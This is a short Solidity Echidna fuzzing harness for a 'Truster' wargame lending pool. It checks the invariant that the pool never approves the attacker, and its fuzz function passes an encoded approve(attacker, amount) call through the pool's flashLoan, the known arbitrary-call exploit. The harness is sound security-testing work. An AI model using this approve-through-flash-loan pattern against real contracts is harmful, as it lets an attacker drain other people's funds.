// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {MyToken} from "../../src/Token.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterEchidna {
    MyToken public token;
    TrusterLenderPool public pool;
    address public immutable attacker;
    uint256 public constant INITIAL_POOL_BALANCE = 1_000_000e18;

    constructor() {
        token = new MyToken("ChallengeToken", "CHL");
        pool = new TrusterLenderPool(token);

        token.mint(address(this), INITIAL_POOL_BALANCE);
        token.transfer(address(pool), INITIAL_POOL_BALANCE);

        attacker = address(this);
        token.mint(attacker, 1000e18);
    }

    // Invariant: No unauthorized approvals
    function echidna_no_unauthorized_approvals() public view returns (bool) {
        return token.allowance(address(pool), attacker) == 0;
    }

    // Fuzzer function
    function attemptApprovalExploit(uint256 amount) public {
        if (amount == 0 || amount > token.balanceOf(address(pool))) return;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, amount);
        try pool.flashLoan(0, attacker, address(token), data) {} catch {}
    }
}
